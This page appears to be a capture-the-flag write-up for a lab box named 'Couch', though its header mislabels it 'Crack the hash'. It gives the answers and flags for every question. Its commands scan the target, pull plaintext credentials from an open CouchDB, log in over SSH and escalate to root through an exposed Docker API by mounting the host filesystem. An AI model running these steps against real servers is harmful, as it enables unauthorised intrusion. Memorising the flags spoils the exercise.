---
layout: default
title: Crack the hash
parent: Easy
nav_order: 3
---

# Couch
## Task 1 | Resy Set Go
### Question 1
```diff
+ Scan the machine. How many ports are open?

+ 2
```
```diff
+ nmap -p- 10.67.173.64

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-27 18:04 -0600
Nmap scan report for 10.67.173.64
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
+22/tcp   open  ssh
+5984/tcp open  couchdb

Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
```
```diff
Official NMAP Project Guide to Network Discovery and Security Scanning. (2008).

+ -p-, Omit beginning and end numbers to scan the whole range (excluding zero). 
```
### Question 2
```diff
+ What is the database management system installed on the server?

+ couchdb
```
```diff
+ nmap -p- 10.67.173.64

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-27 18:04 -0600
Nmap scan report for 10.67.173.64
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
+5984/tcp open  couchdb

Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
```
### Question 3
```diff
+ What port is the database management system running on?

+ 5984
```
```diff
+ nmap -p- 10.67.173.64

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-27 18:04 -0600
Nmap scan report for 10.67.173.64
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
+5984/tcp open  couchdb

Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
```
### Question 4
```diff
+ What is the version of the management system installed on the server?

+ curl http://10.67.173.64:5984

+{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```
```
1.6. Getting started — Apache CouchDB® 3.5 documentation. (n.d.). https://docs.couchdb.org/en/stable/intro/tour.html#all-systems-are-go
```
### Question 5
```diff
+ What is the path for the web administration tool for this database management system?

+ _utils
```
Accesses the built-in Fauxton administration interface for CouchDB (*1.2.1. / — Apache CouchDB® 3.5 Documentation*, n.d.-c).
### Question 6
```diff
+ What is the path to list all databases in the web browser of the database management system?

+ _all_dbs
+ curl -X GET http://10.67.173.64:5984/_all_dbs
```
```diff
+ ["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
```
Returns a list of all the databases in the CouchDB instance (*1.2.1. / — Apache CouchDB® 3.5 Documentation*, n.d.-b).
### Question 7
```diff
+ What are the credentials found in the web administration tool?

+ atena:t4qfzcc4qN##
```
`curl -X GET http://10.67.173.64:5984/secret/_all_docs`
```json
{"total_rows":1,"offset":0,"rows":[
{"id":"a1320dd69fb4570d0a3d26df4e000be7","key":"a1320dd69fb4570d0a3d26df4e000be7","value":{"rev":"2-57b28bd986d343cacd9cb3fca0b20c46"}}
]}
```
`curl -X GET http://10.67.173.64:5984/secret/a1320dd69fb4570d0a3d26df4e000be7`
```json
{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t4qfzcc4qN##"}
```
### Question 8
```diff
+ Compromise the machine and locate user.txt

+ THM{1ns3cure_couchdb}
```
`ssh atena@10.67.136.215`
- **Password**: `t4qfzcc4qN##`
### Question 9
```diff
+ Escalate privileges and obtain root.txt

+ THM{RCE_us1ng_Docker_API}
```
`docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine`

`cat mnt/root/root.txt`